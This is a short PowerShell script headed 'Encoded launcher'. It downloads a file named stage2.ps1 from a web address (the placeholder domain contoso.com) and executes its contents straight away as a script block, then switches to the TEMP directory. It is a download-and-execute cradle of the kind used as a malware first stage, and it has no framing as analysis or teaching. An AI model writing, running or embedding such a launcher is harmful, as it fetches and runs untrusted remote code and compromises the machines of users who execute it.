# Encoded launcher
$FetchUrl = "http://contoso.com/stage2.ps1"
$PayloadText = (iwr $FetchUrl -UseBasicParsing).Content
[ScriptBlock]::Create($PayloadText).Invoke()
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Set-Location -Path $env:TEMP
